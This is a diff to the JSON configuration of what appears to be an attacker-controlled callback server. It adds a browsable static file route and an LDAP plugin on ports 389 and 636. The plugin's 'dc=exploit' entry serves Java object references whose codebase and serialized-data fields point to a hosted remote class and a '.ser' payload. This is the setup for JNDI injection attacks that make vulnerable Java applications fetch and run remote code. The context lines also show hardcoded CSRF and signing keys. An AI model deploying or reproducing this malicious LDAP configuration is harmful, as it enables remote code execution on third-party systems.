@@ -11,6 +11,12 @@
         "csrfKey": "a8mdaslw029jlkjnwn9shdw13dfew53i",
         "signingKey": "SuperSecretSecureSigningKeyOf32b",
         "templatePath": "internal/pkg/http/template/",
+        "static": {
+            "browsing": true,
+            "enable": true,
+            "path": "static/",
+            "prefix": "/repository"
+        },
         "listeners": [
             {
                 "address": "",
@@ -51,5 +57,39 @@
                 }
             }
         ]
+    },
+    "pluginsDirectory": "plugins/",
+    "plugins": {
+        "ldap": {
+            "listeners": [
+                {
+                    "address": "0.0.0.0",
+                    "port": 389
+                },
+                {
+                    "address": "0.0.0.0",
+                    "port": 636,
+                    "tls": {
+                        "publicKey": "certs/star.test.example.company/fullchain.pem",
+                        "privateKey": "certs/star.test.example.company/privkey.pem"
+                    }
+                }
+            ],
+            "dn": [
+                {
+                    "baseDN": "dc=exploit,dc=com",
+                    "attributes": {
+                        "javaClassName": "test.TEST",
+                        "javaCodebase": "https://test.example.company/repository/src/com/conspirator/",
+                        "objectClass": ["javaObject", "javaSerializedObject"],
+                        "javaSerializedData": "file:///bundle/static/test.ser" 
+                    }
+                },
+                {
+                    "baseDN": "",
+                    "attributes": {}
+                }
+            ]
+        }
     }
 }
